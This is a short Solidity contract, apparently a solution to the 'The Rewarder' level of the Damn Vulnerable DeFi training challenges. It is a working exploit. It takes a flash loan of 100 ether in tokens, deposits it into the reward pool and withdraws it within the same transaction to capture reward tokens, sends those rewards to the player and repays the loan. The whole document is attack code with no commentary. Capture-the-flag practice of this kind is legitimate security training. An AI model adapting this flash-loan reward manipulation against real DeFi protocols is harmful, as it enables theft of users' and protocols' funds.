// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

 import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";
import   "./FlashLoanerPool.sol";
import   "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";


contract RewarderAttack{
    FlashLoanerPool loan;
    TheRewarderPool pool;
    DamnValuableToken token;
    RewardToken reward;
    address player ;
    constructor(TheRewarderPool _pool, FlashLoanerPool _loan, DamnValuableToken _token, RewardToken _reward){
        pool = _pool;
        loan=_loan;
        token = _token;
        reward = _reward;
        player= msg.sender;
    }

    function attack()  public{
              loan.flashLoan(100 ether);
    }

    function receiveFlashLoan(uint256 amount) public {
        token.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        reward.transfer(player, reward.balanceOf(address(this)));
        token.transfer(address(loan), amount);
    }
}
